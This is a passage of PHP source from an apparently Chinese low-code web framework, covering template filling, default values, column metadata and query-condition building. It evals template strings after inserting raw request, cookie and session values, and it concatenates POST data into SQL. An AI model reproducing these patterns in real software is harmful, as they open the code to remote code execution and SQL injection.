         $funxx=str_replace("{col-".$kxyz.":dxtype}",$kifx[$kxyz]["COLUMN_DXTYPE"],$funxx);
         $funxx=str_replace("{col-".$kxyz.":default}",$kifx[$kxyz]["COLUMN_DEFAULT"],$funxx);
         $funxx=str_replace("{col-".$kxyz.":explain}",$kifx[$kxyz]["COLUMN_EXPLAIN"],$funxx);
         $funxx=str_replace("{col-".$kxyz.":sqx}",$kifx[$kxyz]["COLUMN_SQX"],$funxx); 
         $funxx=str_replace("{col-".$kxyz.":type}",$kifx[$kxyz]["COLUMN_TYPE"],$funxx);
         $funxx=str_replace("{col-".$kxyz.":tpnm}",$kifx[$kxyz]["COLUMN_TPNM"],$funxx);
         $funxx=str_replace("{col-".$kxyz.":tplen}",$kifx[$kxyz]["COLUMN_TPLEN"],$funxx);
         $funxx=str_replace("{col-".$kxyz.":acthtm}",$kifx[$kxyz]["COLUMN_ACTHTM"],$funxx);
         $funxx=str_replace("{col-".$kxyz.":atnhtm}",$kifx[$kxyz]["COLUMN_ATNHTM"],$funxx);
        }
   return $funxx;
}

function fmvalue($tbnmx,$dvalue,$dsno,$dkey,$sfun,$dn,$arrdt=array(array())){
$smd5="a".md5($tbnmx.$dvalue.$dsno.$dkey.$sfun.$dn);
$nhtxt="";
  
if ($_SESSION[$smd5]!="" and ($dvalue.$dsno.$dkey)!=""){
  return $_SESSION[$smd5];
}else{
 if (($sfun=="" or $dn==-1) and $dsno!="demo"){
      return $dvalue;
 }
  
  //echo $sfun."---------------------------";
  if (strpos("x".$sfun,"CASE")>0 and strpos("x".$sfun,"E@CS")>0){
    $ptfunx=explode("CASE",$sfun);
    $totpf=count($ptfunx);
    $fd=0;
    for ($pf=0;$pf<$totpf;$pf++){
       $tmpfn=qian(hou($ptfunx[$pf],"::"),"E@CS");
       $tmpct=qian($ptfunx[$pf],"::");
       $tmptj=substr($ptfunx[$pf],0,1);
       $tmpvlx=hou($tmpct,$tmptj);
       if ($tmptj=="@"){
         if (((strpos("xxx".$dvalue,$tmpvlx)>0 and $tmpvlx!="") or $tmpvlx=="") and $fd==0){
           $sfun=$tmpfn;
           $fd=$fd+1;
         };
       }else{
         if ($tmptj!="="){
           if ($tmptj==">"){
            if ((($tmpvlx*1)>($dvalue*1)) and $tmpvlx!="" and $fd==0){
             $sfun=$tmpfn;
             $fd=$fd+1;
            };
           }
           if ($tmptj=="<"){
            if ((($tmpvlx*1)<($dvalue*1)) and $tmpvlx!="" and $fd==0){
             $sfun=$tmpfn;
             $fd=$fd+1;
            };
           }
         }else{
          if (($dvalue==$tmpvlx or (intval($dvalue)*1)==(intval($tmpvlx)*1)) and $tmpvlx!="" and $fd==0){
             $sfun=$tmpfn;
             $fd=$fd+1;
           };
         };
       }
    };//for
    if ($fd==0){      
    }
  }else{
  };  
 if (strpos(".".$sfun,"FUN:")>0) { 
    $sfun=turncon($sfun);
   //把sfun 的中括号换成尖括号 防止解析出来 的中括号再被解析 比如thisvalue里如果有中括号的就不该被解析 如果遇到同样的东西解析 可以换种形式比如 js里的huanhang();就可以很好的规避跟PHP的换行在一起
     $thisvalue="";
     $funx=hou(".".$sfun,"FUN:");
     $funx=str_replace("{thisid}","ipt".$dkey.$dsno,$sfun);
     $funx=str_replace("{thiskey}",$dkey,$funx);
	 $funx=str_replace("{thistable}",$tbnmx,$funx);
     $funx=str_replace("{thissno}",$dsno,$funx);
        $funx=str_replace("{tmpks}",$dkey.$dsno,$funx);
            $funx=str_replace("{SNO}",$dsno,$funx);
            $funx=str_replace("{key}",$dkey,$funx);
            $funx=str_replace("{key0}","p_".$dkey.$dsno,$funx);
            $funx=str_replace("{table}",$tbnmx,$funx);
            $funx=str_replace("{OLMK}",onlymark(),$funx);
      $funx=str_replace("{date}",date("Y-m-d"),$funx);
       $funx=str_replace("{now}",date("Y-m-d H:i:s"),$funx);
     $funx=str_replace("{thisshort}",$_GET["tmpshortid"],$funx);
     $funx=str_replace("{thisshort}",$_GET["tmpstid"],$funx);
     $funx=str_replace("{shortid}",$_GET["shortid"],$funx);
     $funx=str_replace("{shortid}",$_GET["stid"],$funx);
     $funx=str_replace("{thisvalue}",tostring($dvalue),$funx);
     $funx=str_replace("{iptoarea}",ipToArea(tostring($dvalue)),$funx);
     $funx=str_replace("{siteurl}",glw(),$funx);
	 $funx=str_replace("{rip}",getip(),$funx);
     $funx=str_replace("{uid}",$_COOKIE["uid"],$funx);
     $funx=str_replace("{rids}",$_COOKIE["rids"],$funx);
     $funx=str_replace("{cid}",$_COOKIE["cid"],$funx);
     if (strpos("xxx".$sfunx,"{col-key")>0){
        $kfun=array(array());
        $kfun=thekeyfun($kfun,glb(),$tbnmx,$arrdt["table"]["keys"]);                             
        $funx=keyexc($dkey,$arrdt["table"]["keys"],$kfun,$funx);
     }
     $grp=atv("(coode_sysdefault@companyid='".$_COOKIE["cid"]."').groupid");
     $funx=str_replace("{grp}",$grp,$funx);
     $funx=str_replace("{appid}",$_GET["appid"],$funx);
     $funx=str_replace("{defaultbase}",glb(),$funx);
     $funx=str_replace("{defaultip}",gl(),$funx);
   
   if ($dvalue=="1" or $dvalue=="checked"){
      $funx=str_replace("{checked}","checked",$funx);
    }else{
      $funx=str_replace("{checked}","",$funx);
    };//
   
   if ($dvalue==""){
     $funx=str_replace("{imgvalue}",dfp(),$funx);
   }else{
     $funx=str_replace("{imgvalue}",$dvalue,$funx);
   };//
   
     $funx=str_replace("{today}",date("Y-m-d"),$funx);
     $funx=str_replace("{now}",date("Y-m-d H:i:s"),$funx);
     
   if (strpos("xxx".$funx,"{duofile-")>0){
     $ftj=qian(hou($funx,"{duofile-"),"}");
     $funx=str_replace("{duofile-".$ftj."}",duofilex($ftj,$dvalue),$funx);     
   };//
     
     $ptnhtxt=explode("{key-",$funx);
     $totpt=count($ptnhtxt);
     for ($f=0;$f<$totpt;$f++){
       $tmpok=qian($ptnhtxt[$f],"}");
       $funx=str_replace("{key-".$tmpok."}",$arrdt[$tmpok][$dn],$funx);
     };//
     if (strpos("xxx".$sfunx,"{col-")>0){
        $kfun=array(array());
        $kfun=thekeyfun($kfun,glb(),$tbnmx,$arrdt["table"]["keys"]);                     
        $ptnhtxt=explode("{col-",$funx);
        $totpt=count($ptnhtxt);
       for ($f=0;$f<$totpt;$f++){
         $tmpok=qian($ptnhtxt[$f],"}");
         $tmpokx=qian($tmpok,":");         
         $funx=keyexc($tmpokx,$arrdt["table"]["keys"],$kfun,$funx);
       };//
      }
   $ptnhtxt=explode("{get-",$funx);
   $totpt=count($ptnhtxt);
   for ($f=0;$f<$totpt;$f++){
      $tmpok=qian($ptnhtxt[$f],"}");
      $funx=str_replace("{get-".$tmpok."}",$_GET[$tmpok],$funx);
     //$arrdt[[$tmpok][$dn]
   };//
   $ptnhtxt=explode("{post-",$funx);
   $totpt=count($ptnhtxt);
   for ($f=0;$f<$totpt;$f++){
      $tmpok=qian($ptnhtxt[$f],"}");
      $funx=str_replace("{post-".$tmpok."}",$_POST[$tmpok],$funx);
     //$arrdt[[$tmpok][$dn]
   };//
   $ptnhtxt=explode("{cookie-",$funx);
   $totpt=count($ptnhtxt);
   for ($f=0;$f<$totpt;$f++){
      $tmpok=qian($ptnhtxt[$f],"}");
      $funx=str_replace("{cookie-".$tmpok."}",$_COOKIE[$tmpok],$funx);
     //$arrdt[[$tmpok][$dn]
   };//
   $ptnhtxt=explode("{session-",$funx);
   $totpt=count($ptnhtxt);
   for ($f=0;$f<$totpt;$f++){
      $tmpok=qian($ptnhtxt[$f],"}");
      $funx=str_replace("{session-".$tmpok."}",$_SESSION[$tmpok],$funx);
     //$arrdt[[$tmpok][$dn]
   };//
     if (strpos($funx,"{atv-")>0){
       $ptatv=explode("{atv-",$funx);
       $totatv=count($ptatv);
       for ($g=0;$g<$totatv;$g++){
         $tmpatv=qian($ptatv[$g],"}");
         $nhtxt=str_replace("{atv-".$tmpatv."}",atv($tmpatv),$funx);
       //$arrdt[[$tmpok][$dn]
      };//
   };//
  if (strpos($funx,"{utv-")>0){
    $ptutv=explode("{utv-",$funx);
    $totutv=count($ptutv);
    for ($h=0;$h<$totutv;$h++){
      $tmputv=qian($ptutv[$h],"}");
      $nhtxt=str_replace("{utv-".$tmputv."}",utv($tmputv),$funx);
     //$arrdt[[$tmpok][$dn]
    };//
  };//
    $funx=hou($funx,"FUN:");  
    $funx=str_replace("funvalue","fvalue",$funx);
    eval($funx);
    $nhtxt=$fvalue; 
 }else{
   $sfun=turncon($sfun);
  if (strpos("x".$sfun,"{")>0 or strpos($sfun,"}")>0 ){
   $nhtxt=str_replace("{thisid}","ipt".$dkey.$dsno,$sfun);   
   $nhtxt=str_replace("{thiskey}",$dkey,$nhtxt);
   if (strpos("xxx".$nhtxt,"{col-key")>0){
        $kfun=array(array());
        $kfun=thekeyfun($kfun,glb(),$tbnmx,$arrdt["table"]["keys"]);                             
       $nhtxt=keyexc($dkey,$arrdt["table"]["keys"],$kfun,$nhtxt);
    }
   $nhtxt=str_replace("{thistable}",$tbnmx,$nhtxt);
   $grp=atv("(coode_sysdefault@companyid='".$_COOKIE["cid"]."').groupid");
   $nhtxt=str_replace("{grp}",$grp,$nhtxt);
   $nhtxt=str_replace("{thissno}",$dsno,$nhtxt);
            $nhtxt=str_replace("{SNO}",$dsno,$nhtxt);
            $nhtxt=str_replace("{key}",$dkey,$nhtxt);
            $nhtxt=str_replace("{key0}","p_".$dkey.$dsno,$nhtxt);
            $nhtxt=str_replace("{table}",$tbnmx,$nhtxt);
            $nhtxt=str_replace("{OLMK}",onlymark(),$nhtxt);
      $nhtxt=str_replace("{date}",date("Y-m-d"),$nhtxt);
       $nhtxt=str_replace("{now}",date("Y-m-d H:i:s"),$nhtxt);
   $nhtxt=str_replace("{uid}",$_COOKIE["uid"],$nhtxt);
   $nhtxt=str_replace("{rids}",$_COOKIE["rids"],$nhtxt);
   $nhtxt=str_replace("{cid}",$_COOKIE["cid"],$nhtxt);
   $nhtxt=str_replace("{appid}",$_GET["appid"],$nhtxt);
   $nhtxt=str_replace("{thisshort}",$_GET["tmpshortid"],$nhtxt);
   $nhtxt=str_replace("{thisshort}",$_GET["tmpstid"],$nhtxt);
   $nhtxt=str_replace("{shortid}",$_GET["shortid"],$nhtxt);
   $nhtxt=str_replace("{shortid}",$_GET["stid"],$nhtxt);
   $nhtxt=str_replace("{thisvalue}",tostring($dvalue),$nhtxt);
   $nhtxt=str_replace("{iptoarea}",ipToArea(tostring($dvalue)),$nhtxt);
   if ($dvalue=="1" or $dvalue=="checked"){
     $nhtxt=str_replace("{checked}","checked",$nhtxt);
   }else{
     $nhtxt=str_replace("{checked}","",$nhtxt);
   };//
   if ($dvalue==""){
     $nhtxt=str_replace("{imgvalue}",dfp(),$nhtxt);
   }else{
     $nhtxt=str_replace("{imgvalue}",$dvalue,$nhtxt);
   };//
   $nhtxt=str_replace("{siteurl}",glw(),$nhtxt);
   $nhtxt=str_replace("{rip}",getip(),$nhtxt);
   $nhtxt=str_replace("{defaultbase}",glb(),$nhtxt);
   $nhtxt=str_replace("{defaultip}",gl(),$nhtxt);
   $nhtxt=str_replace("{today}",date("Y-m-d"),$nhtxt);
   $nhtxt=str_replace("{now}",date("Y-m-d H:i:s"),$nhtxt);
   //echo "<!-- find dkey=.--".$dkey."--".$nhtxt." -->";
   if (strpos("xxx".$nhtxt,"{duofile-")>0){     
     $ftj=qian(hou($nhtxt,"{duofile-"),"}");
     //echo "<!-- find duofile.--".$ftj." -->";
     $nhtxt=str_replace("{duofile-".$ftj."}",duofilex($ftj,tostring($dvalue)),$nhtxt);     
   };//
   $ptnhtxt=explode("{key-",$nhtxt);
   $totpt=count($ptnhtxt);
    //echo "totptk=".$totpt;
    // var_dump($arrdt);
   for ($f=0;$f<$totpt;$f++){
      $tmpok=qian($ptnhtxt[$f],"}");
      $nhtxt=str_replace("{key-".$tmpok."}",$arrdt[$tmpok][$dn],$nhtxt);
     //$arrdt[[$tmpok][$dn]
   };//
     if (strpos("xxx".$nhtxt,"{col-")>0){
        $kfun=array(array());
        $kfun=thekeyfun($kfun,glb(),$tbnmx,$arrdt["table"]["keys"]);                     
        $ptnhtxt=explode("{col-",$nhtxt);
        $totpt=count($ptnhtxt);       
       for ($f=0;$f<$totpt;$f++){
         $tmpok=qian($ptnhtxt[$f],"}");
         $tmpokx=qian($tmpok,":");
         $nhtxt=keyexc($tmpokx,$arrdt["table"]["keys"],$kfun,$nhtxt);
       };//
    }
   $ptnhtxt=explode("{get-",$nhtxt);
   $totpt=count($ptnhtxt);
   for ($f=0;$f<$totpt;$f++){
      $tmpok=qian($ptnhtxt[$f],"}");
      $nhtxt=str_replace("{get-".$tmpok."}",$_GET[$tmpok],$nhtxt);
     //$arrdt[[$tmpok][$dn]
   };//
   $ptnhtxt=explode("{post-",$nhtxt);
   $totpt=count($ptnhtxt);
   for ($f=0;$f<$totpt;$f++){
      $tmpok=qian($ptnhtxt[$f],"}");
      $nhtxt=str_replace("{post-".$tmpok."}",$_POST[$tmpok],$nhtxt);
     //$arrdt[[$tmpok][$dn]
   };//
   $ptnhtxt=explode("{cookie-",$nhtxt);
   $totpt=count($ptnhtxt);
   for ($f=0;$f<$totpt;$f++){
      $tmpok=qian($ptnhtxt[$f],"}");
      $nhtxt=str_replace("{cookie-".$tmpok."}",$_COOKIE[$tmpok],$nhtxt);
     //$arrdt[[$tmpok][$dn]
   };//
   $ptnhtxt=explode("{session-",$nhtxt);
   $totpt=count($ptnhtxt);
   for ($f=0;$f<$totpt;$f++){
      $tmpok=qian($ptnhtxt[$f],"}");
      $nhtxt=str_replace("{session-".$tmpok."}",$_SESSION[$tmpok],$nhtxt);
     //$arrdt[[$tmpok][$dn]
   };//
   if (strpos($nhtxt,"{atv-")>0){
    $ptatv=explode("{atv-",$nhtxt);
    $totatv=count($ptatv);
    for ($g=0;$g<$totatv;$g++){
      $tmpatv=qian($ptatv[$g],"}");
      $nhtxt=str_replace("{atv-".$tmpatv."}",atv($tmpatv),$nhtxt);
     //$arrdt[[$tmpok][$dn]
    };//
   };//
   if (strpos($nhtxt,"{utv-")>0){
     $ptutv=explode("{utv-",$nhtxt);
     $totutv=count($ptutv);
     for ($h=0;$h<$totutv;$h++){
      $tmputv=qian($ptutv[$h],"}");
      $nhtxt=str_replace("{utv-".$tmputv."}",utv($tmputv),$nhtxt);
     //$arrdt[[$tmpok][$dn]
      };//
    };//
  }else{
     $nhtxt=$sfun;//未发现里面有{  } 无法转译
  };//if sfun {  } <
 };// if FUN:
 //echo "@@@".$dvalue."----".$nhtxt;
   $nhtxt=turnlab($nhtxt);
   $_SESSION[$smd5]=$nhtxt;
   return $nhtxt;
 };//session
}
function arrdefault($kies,$kinfo=array(),$arrdt=array()){
  if ($kies!=""){
    $ptkie=explode(",",$kies);
    $totp=count($ptkie);
    for ($w=0;$w<$totp;$w++){
       $arrdt[$ptkie[$w]][0]="";
      if ($ptkie[$w]!=""){
        if (strpos($kinfo[$ptkie[$w]]["COLUMN_SSHOW"],"|")>0){
          $thusvalue="";
          eval(hou($kinfo[$ptkie[$w]]["COLUMN_SSHOW"],"|"));
          $arrdt[$ptkie[$w]][0]=$thusvalue;
        }else{
          if ($kinfo[$ptkie[$w]]["COLUMN_DEFAULT"]!=""){
            if (strpos($kinfo[$ptkie[$w]]["COLUMN_DEFAULT"],"defaultv")>0){
              $defaultv="";
              eval($kinfo[$ptkie[$w]]["COLUMN_DEFAULT"]);
              $arrdt[$ptkie[$w]][0]=$defaultv;
            }else{
              $arrdt[$ptkie[$w]][0]=$kinfo[$ptkie[$w]]["COLUMN_DEFAULT"];
            }
          }else{
              $arrdt[$ptkie[$w]][0]="";
          };//cdft
        }//csshow
      }//ptkie
    }
  }
  return $arrdt;
}
function arrdata($tbrst=array(array()),$selerst){
$tmpkies=qian($selerst,"#/#");
$tmpkiep=explode("#-#",$tmpkies);
$totpx=count($tmpkiep);
$selerst=$selerst."#/#";
$tmpvalrp=explode('#/#',$selerst);
$tottbrst=count($tmpvalrp)-1;
 for ($jx=1;$jx<$tottbrst;$jx++){ //因为第一行是KEYS所以数量不变如果不存在他就是0-N   
   for ($ix=0;$ix<$totpx;$ix++){
     $tmpvalrx=explode("#-#",$tmpvalrp[$jx]);     
     if ($tbrst[$tmpkiep[$ix]][$tottbrst]*1==0){
       $tbrst[$tmpkiep[$ix]][$tottbrst]=0;       
     }
      $tbrst[$tmpkiep[$ix]][$jx]=$tmpvalrx[$ix];//赋值核心
       if ((intval($tmpvalrx[$ix])*1)!=0){
           $tbrst[$tmpkiep[$ix]][$tottbrst]=$tbrst[$tmpkiep[$ix]][$tottbrst]+($tmpvalrx[$ix]*1);
       }else{
           $tbrst[$tmpkiep[$ix]][$tottbrst]=$tbrst[$tmpkiep[$ix]][$tottbrst]+0;
       }
   };
 };
 for ($ix=0;$ix<$totpx;$ix++){//第0行也弄上，用于赋值初始值。
      $tbrst[$tmpkiep[$ix]][0]="DFT_".$tmpkiep[$ix];       
 };
 $tbrst["table"]["keys"]=str_replace("#-#",",",$tmpkies);
 $tbrst["table"]["count"]=$tottbrst;
//$c = array_merge($a,$b);
return $tbrst;
}
function makedefault($dtarr=array(array()),$kif=array(array())){
  $keyx=$dtarr["table"]["keys"];
  $ptkx=explode(",",$keyx);
  $totp=count($ptkx);  
  for ($i=0;$i<$totp;$i++){
    $sshow=$kif[$ptkx[$i]]["COLUMN_SSHOW"];
    $ddft=$kif[$ptkx[$i]]["COLUMN_DEFAULT"];
    $defaultv="";
    $thusvalue="";  
    $dtarr[$ptkx[$i]][0]="";  
    if (strpos($ddft,"defaultv=")>0){
      eval(hou($ddft,"|"));
      $dtarr[$ptkx[$i]][0]=$defaultv;
    }else{     
    }
    if (strpos($sshow,"thusvalue=")>0){
      eval(hou($sshow,"|"));
      $dtarr[$ptkx[$i]][0]=$thusvalue;
    }else{
    }
    if ($ptkx[$i]=="SNO"){
      $dtarr[$ptkx[$i]][0]="0";
    }
  }
  return $dtarr;
}
function allkeyinfo($kbase=array(array()),$dbnm,$tbnm){
//NEED FUNCTION -selecteds() @ connmysql.php;
  if (_get("datahost")==""){
    $conn=mysql_connect(gl(),glu(),glp());
  }else{
    $conn["host"]=_get("datahost");
  }
$krest=selectedx($conn,"information_schema","select TABLE_NAME,COLUMN_NAME,COLUMN_TYPE from COLUMNS where ',".$tbnm.",' like concat('%',TABLE_NAME,'%') and TABLE_SCHEMA='".$dbnm."'","utf8","");
 //NEED FUNCTION -countresult() @ connmysql.php;
 $totkc=countresult($krest);
 $dd=$tbnm."akb=new Array();\r\n";
 $fmakeys="";
 $fmakeysb="";
  $dd=$dd.$tbnm."akb[\"COLUTB\"]=new Array();\r\n";
  $dd=$dd.$tbnm."akb[\"COLUMN\"]=new Array();\r\n";
  for ($c=0;$c<$totkc;$c++){
    $dd=$dd.$tbnm."akb[\"".anyvalue($krest,"COLUMN_NAME",$c)."\"]=new Array();\r\n";
    $kbase[anyvalue($krest,"COLUMN_NAME",$c)]["COLUMN_TYPE"]=anyvalue($krest,"COLUMN_TYPE",$c);
    $dd=$dd.$tbnm."akb[\"".anyvalue($krest,"COLUMN_NAME",$c)."\"][\"COLUMN_TYPE\"]=\"".anyvalue($krest,"COLUMN_TYPE",$c)."\";\r\n";
    $kbase[anyvalue($krest,"COLUMN_NAME",$c)]["COLUMN_TPNM"]=qian(anyvalue($krest,"COLUMN_TYPE",$c),"(");
    $dd=$dd.$tbnm."akb[\"".anyvalue($krest,"COLUMN_NAME",$c)."\"][\"COLUMN_TPNM\"]=\"".qian(anyvalue($krest,"COLUMN_TYPE",$c),"(")."\";\r\n";
    $kbase[anyvalue($krest,"COLUMN_NAME",$c)]["COLUMN_TPLEN"]=qian(hou(anyvalue($krest,"COLUMN_TYPE",$c),"("),")");
    $dd=$dd.$tbnm."akb[\"".anyvalue($krest,"COLUMN_NAME",$c)."\"][\"COLUMN_TPLEN\"]=\"".qian(hou(anyvalue($krest,"COLUMN_TPLEN",$c),"("),")")."\";\r\n";
    $kbase["COLUTB"][$c]=anyvalue($krest,"TABLE_NAME",$c);
    $dd=$dd.$tbnm."akb[\"COLUTB\"][".$c."]=\"".anyvalue($krest,"TABLE_NAME",$c)."\";\r\n";
    $kbase["COLUMN"][$c]=anyvalue($krest,"COLUMN_NAME",$c);
    $dd=$dd.$tbnm."akb[\"COLUMN\"][".$c."]=\"".anyvalue($krest,"COLUMN_NAME",$c)."\";\r\n";
    $fmakeys=$fmakeys.anyvalue($krest,"COLUMN_NAME",$c).",";
    $fmakeysb=$fmakeysb.anyvalue($krest,"TABLE_NAME",$c).".".anyvalue($krest,"COLUMN_NAME",$c).",";
 };
 $fmakeys=substr($fmakeys,0,strlen($fmakeys)-1);
 $fmakeysb=substr($fmakeysb,0,strlen($fmakeysb)-1);

 $kbase["COLUMN"]["COUNT"]=$totkc;
  $dd=$dd.$tbnm."akb[\"COLUMN\"][\"COUNT\"]=".$totkc.";\r\n";
 $kbase["COLUMN"]["ALLKEY"]=$fmakeys;
  $dd=$dd.$tbnm."akb[\"COLUMN\"][\"ALLKEY\"]=\"".$fmakeys."\";\r\n";
 $kbase["COLUMN"]["ALLTKEY"]=$fmakeysb;
  $dd=$dd.$tbnm."akb[\"COLUMN\"][\"ALLTKEY\"]=\"".$fmakeysb."\";\r\n";
 $kbase["CODE"]["JS"]=$dd;
return $kbase;
}

function thekeyinfo($kbase=array(array()),$dbnm,$tbnm,$keys){
 if (_get("datahost")==""){
    $conn=mysql_connect(gl(),glu(),glp());
 }else{
    $conn["host"]=_get("datahost");
 }
//NEED FUNCTION -selecteds() @ connmysql.php;
$dd=$tbnm."kb=new Array();\r\n";
if ($keys=="*"){
  $krest=selectedx($conn,"information_schema","select COLUMN_NAME,COLUMN_TYPE from COLUMNS where TABLE_SCHEMA='".$dbnm."' and TABLE_NAME='".$tbnm."' ","utf8","");
}else{
  $krest=selectedx($conn,"information_schema","select COLUMN_NAME,COLUMN_TYPE from COLUMNS where TABLE_SCHEMA='".$dbnm."' and TABLE_NAME='".$tbnm."' and ',".$keys.",' like concat('%,',COLUMN_NAME,',%')","utf8","");
}
//echo $krest;
 //NEED FUNCTION -countresult() @ connmysql.php;
 $totkc=countresult($krest);
  $dd=$dd.$tbnm."kb[\"COLUMN\"]=new Array();\r\n";
  for ($c=0;$c<$totkc;$c++){
    $dd=$dd.$tbnm."kb[\"".anyvalue($krest,"COLUMN_NAME",$c)."\"]=new Array();\r\n";
    $kbase[anyvalue($krest,"COLUMN_NAME",$c)]["COLUMN_TYPE"]=anyvalue($krest,"COLUMN_TYPE",$c);
    $dd=$dd.$tbnm."kb[\"".anyvalue($krest,"COLUMN_NAME",$c)."\"][\"COLUMN_TYPE\"]=\"".anyvalue($krest,"COLUMN_TYPE",$c)."\";\r\n";
    $kbase[anyvalue($krest,"COLUMN_NAME",$c)]["COLUMN_TPNM"]=qian(anyvalue($krest,"COLUMN_TYPE",$c),"(");
    $dd=$dd.$tbnm."kb[\"".anyvalue($krest,"COLUMN_NAME",$c)."\"][\"COLUMN_TPNM\"]=\"".qian(anyvalue($krest,"COLUMN_TYPE",$c),"(")."\";\r\n";
    $kbase[anyvalue($krest,"COLUMN_NAME",$c)]["COLUMN_TPLEN"]=qian(hou(anyvalue($krest,"COLUMN_TYPE",$c),"("),")");
    $dd=$dd.$tbnm."kb[\"".anyvalue($krest,"COLUMN_NAME",$c)."\"][\"COLUMN_TPLEN\"]=\"".qian(hou(anyvalue($krest,"COLUMN_TYPE",$c),"("),")")."\";\r\n";
    $kbase["COLUMN"][$c]=anyvalue($krest,"COLUMN_NAME",$c);
    $dd=$dd.$tbnm."kb[\"COLUMN\"][\"".$c."\"]=\"".anyvalue($krest,"COLUMN_NAME",$c)."\";\r\n";
 };  
 $kbase["COLUMN"]["COUNT"]=$totkc;
  $dd=$dd.$tbnm."kb[\"COLUMN\"][\"COUNT\"]=".$totkc.";\r\n";
 $kbase["CODE"]["JS"]=$dd;
return $kbase;
}
  
function massvfpost($gtbs,$gkies,$gsno){
  if ($gtbs!="" and $gkies!="" ){
   if ($gsno==""){
     $gsno="0";
   }
   if ($gkies=="-killitem"){
     return 1;
   }else{
     $krst=SX("select DATA_TYPE,dxtype,IS_NULLABLE,COLUMN_NAME,STATUS from coode_keydetailx where TABLE_NAME='".$gtbs."' and 'x,".$gkies.",' like concat('%',COLUMN_NAME,'%') and COLUMN_NAME<>'SNO'");
     $totk=countresult($krst);
     $lji=1;
     for ($i=0;$i<$totk;$i++){
      $lji=$lji*verifypost(anyvalue($krst,"DATA_TYPE",$i),1,anyvalue($krst,"dxtype",$i),anyvalue($krst,"STATUS",$i),_post("p_".anyvalue($krst,"COLUMN_NAME",$i).$gsno));
     }
     return $lji;
   }
 }else{    
    return 0;
 } 
}
function verifypost($dtype,$tplen,$dxtp,$minlen,$vlsx){
  if ((intval($minlen)*1)!=0){
    //判断
    if ($vlsx!=""){
    switch($dtype){
      case "int":
        return 1;
        break;
      case "varchar":
        return 1;
        break;
      case "tinyint":
        return 1;
        break;
      case "decimal":
        return 1;
        break;
      case "text":
        return 1;
        break;
      case "longtext":
        return 1;
        break;
      case "date":
        if (strtotime($vlsx)!=""){
          return 1;
        }else{
          return 0;
        }
        break;
      case "datetime":
        if (strtotime($vlsx)!=""){
          return 1;
        }else{
          return 0;
        }
        break;
      default:
        return 1;
     }
    }else{
      return 0;
    }
  }else{
        switch($dtype){
      case "int":
        return 1;
        break;
      case "varchar":
        return 1;
        break;
      case "tinyint":
        return 1;
        break;
      case "decimal":
        return 1;
        break;
      case "text":
        return 1;
        break;
      case "longtext":
        return 1;
        break;
      case "date":
        if (strtotime($vlsx)!=""){
          return 1;
        }else{
          return 0;
        }
        break;
      case "datetime":
        if (strtotime($vlsx)!=""){
          return 1;
        }else{
          if ($vlsx!=""){
            return 0;
          }else{
            return 1;
          }
        }
        break;
      default: 
        return 1;
    }       

  }
}
function keyframe($kf=array(array()),$akeys){
 $ptk=explode(",",$akeys);
 $totk=count($ptk);
 $fmfrm="+";
 for ($t=0;$t<$totk;$t++){
   if ($kf[$ptk[$t]]["COLUMN_TPLEN"]>0){

        if ($kf[$ptk[$t]]["COLUMN_TPLEN"]>=50 || $kf[$ptk[$t]]["COLUMN_CLSTXT"]!="" || $ptk[$t]=="SNO" ){
         if (strpos("x".$kf[$ptk[$t]]["COLUMN_CLSTXT"],"union-")<=0 && strpos("x".$kf[$ptk[$t]]["COLUMN_CLSTXT"],"TYPE_HEX")<=0){
          $fmfrm=$fmfrm."+".$ptk[$t]."+";
         }else{
          $fmfrm=$fmfrm."*".$ptk[$t]; //最后++,*+合并成 +
         };
        }else{
         $fmfrm=$fmfrm."*".$ptk[$t]; //最后++,*+合并成 +
        };
      }else{

        if ( $kf[$ptk[$t]]["COLUMN_CLSTXT"]!="" ){
         if (strpos("x".$kf[$ptk[$t]]["COLUMN_CLSTXT"],"union-")<=0 && strpos("x".$kf[$ptk[$t]]["COLUMN_CLSTXT"],"TYPE_HEX")<=0){
          $fmfrm=$fmfrm."+".$ptk[$t]."+";
         }else{
          $fmfrm=$fmfrm."*".$ptk[$t]; //最后++,*+合并成 +
         };
        }else{
         $fmfrm=$fmfrm."*".$ptk[$t]; //最后++,*+合并成 +
        };
      };
 };
      $fmfrm=$fmfrm."0"; //
  $fmfrm=str_replace("*+","+",$fmfrm);
  $fmfrm=str_replace("+*","+",$fmfrm);
  $fmfrm=str_replace("++","+",$fmfrm);
return $fmfrm;
}

function formdcdt($tbkiss,$kothern){
  $fmpcdt="";
  if ($tbkiss==""){
    return "";
  }else{
    if ($kothern!=""){
      $tballks=",".$tbkiss.",";      
      $qother=qian($kothern,"|");
      $hother=hou($kothern,"|");
      if (strpos($qother,",")>0){
        $ptotherq=explode(",",$qother);
        $ptotherh=explode(",",$hother);
        $totp=count($ptotherq);
        for ($z=0;$z<$totp;$z++){
          $tballks=str_replace(",".$ptotherh[$z].",",",".$ptotherq[$z].",",$tballks);
        }
      }else{
          $tballks=str_replace(",".$hother.",",",".$qother.",",$tballks);
      }
      
      $newallk=substr($tballks,1,strlen($tballks)-2);      
    }else{
      $newallk=$tbkiss;
    }    
      $ptnew=explode(",",$newallk);
      $ptold=explode(",",$tbkiss);
      $totpt=count($ptnew);
      for ($z=0;$z<$totpt;$z++){
        if ($ptnew[$z]!="" and $_POST[$ptnew[$z]]!=""){
          if (strpos($_POST[$ptnew[$z]],",")>0){
            $ptpot=explode(",",$_POST[$ptnew[$z]]);
            $totpp=count($ptpot);
            $fmooo="";
            for ($m=0;$m<$totpp;$m++){
              $fmooo=$fmooo.$ptold[$z]."='".$ptpot[$m]."' or ";
            }
            $fmooo="( ".substr($fmooo,0,strlen($fmooo)-3)." )";
            $fmpcdt=$fmpcdt.$fmooo." and ";
          }else{            
           $fmpcdt=$fmpcdt.$ptold[$z]."='".$_POST[$ptnew[$z]]."' and ";
          }
        }
      }
    if ( $_POST["lockType"]!=""){
      $fmpcdt=$fmpcdt."isLock='".$_POST["lockType"]."' and ";
    }
  }  
  return $fmpcdt;  
}
function anyshort($stid,$page,$pagenum){  
  $urix=$_SERVER['REQUEST_URI'];
  $uriy=hou($urix,"?");
  $ptur=explode("&",$uriy);
  $totpt=count($ptur);
  $notx="-/stid/page/pnum/pagenum/rdr/rnd/datatype/qry/qrl/xkey/xval/sc/";
  $fmkvx="";
  for ($z=0;$z<$totpt;$z++){
    if (strpos($notx,"/".qian($ptur[$z],"=")."/")>0){
    }else{
      $fmkvx=$fmkvx."&".qian($ptur[$z],"=")."=".hou($ptur[$z],"=");
    }
  }  
  $_GET["fmkvx"]=$fmkvx;  
  $page=str_replace("undefined","1",$page);  
  $pagenum=str_replace("undefined","30",$pagenum);    
